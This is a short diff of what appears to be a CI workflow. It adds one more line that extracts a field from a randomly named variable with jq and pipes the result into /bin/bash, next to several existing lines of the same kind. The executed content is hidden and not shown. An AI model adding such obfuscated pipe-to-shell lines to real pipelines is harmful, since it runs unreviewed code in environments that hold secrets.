@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$wdcv169" | jq -r .cyhiv32 | /bin/bash
           printf '%s' "$s56652" | jq -r .vs334 | /bin/bash
           echo $dsrl110 | jq -r .ov2 | /bin/bash
+          echo $xug475 | jq -r .zpb3 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
